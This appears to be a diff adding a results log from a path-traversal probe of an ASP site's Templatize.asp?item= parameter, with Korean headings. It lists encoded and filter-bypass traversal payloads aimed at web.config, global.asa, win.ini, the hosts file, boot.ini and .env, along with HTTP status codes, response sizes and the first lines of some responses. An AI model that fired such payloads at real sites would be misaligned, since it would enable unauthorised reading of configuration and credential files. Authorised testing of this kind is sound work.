@@ -1,0 +1,191 @@
+### A. Templatize.asp?item= — 파라미터/경로 변형 (읽기 전용)
+LABEL                        ITEM                                     CODE SIZE
+baseline_noparam                                                      500 1208
+item_empty                                                            500 1208
+known_good                   html/about.html                          200 4594
+db_asp                       db.asp                                   200 2908
+loginput_asp                 logInput.asp                             200 3538
+templatize_self              Templatize.asp                           200 5993
+default_asp                  Default.asp                              200 7142
+search_asp                   Search.asp                               200 7786
+login_asp                    Login.asp                                200 7154
+showthread_asp               ShowThread.asp                           200 9786
+showforum_asp                ShowForum.asp                            200 10668
+shownews_asp                 shownews.asp                             200 2991
+register_asp                 Register.asp                             200 7367
+web_config                   web.config                               200 3138
+global_asa                   global.asa                               500 1208
+abs_webconfig                /web.config                              200 3144
+abs_globalasa                /global.asa                              500 1208
+dot_webconfig                ./web.config                             200 3150
+slash_db_asp                 /db.asp                                  200 2914
+dotdot_plain                 ../db.asp                                500 1208
+dotdot_enc                   ..%2fdb.asp                              500 1208
+dotdot_pct2e                 %2e%2e/db.asp                            500 1208
+html_dotdot_webconfig        html/../web.config                       200 3170
+html_dotdot_dbasp            html/../db.asp                           200 2940
+dotdot4_winini               ..%2f..%2f..%2f..%2fwindows%2fwin.ini    200 2783
+dotdot4_hosts                ..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts 200 3629
+dotdot8_winini               ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini 200 2871
+dotdot_upper                 ..%2F..%2F..%2F..%2Fwindows%2Fwin.ini    200 2783
+dotdot_plain_slash           ../../../../windows/win.ini              200 2763
+abs_winini                   /windows/win.ini                         500 1208
+dotdot_dotdot_slash          ....//....//....//....//windows/win.ini  500 1208
+dotdot4_bootini              ..%2f..%2f..%2f..%2fboot.ini             500 1208
+dotdot6_dotenv               ..%2f..%2f..%2f..%2f..%2f..%2f.env       500 1208
+
+### A2. 응답 본문 첫 12줄 (원문 확인용)
+--- db_asp ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- loginput_asp ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- templatize_self ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- shownews_asp ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- web_config ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- global_asa ---
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>500 - Internal server error.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+
+--- abs_webconfig ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- html_dotdot_webconfig ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- dotdot4_winini ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- dotdot4_hosts ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+
+--- dotdot6_dotenv ---
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>500 - Internal server error.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+
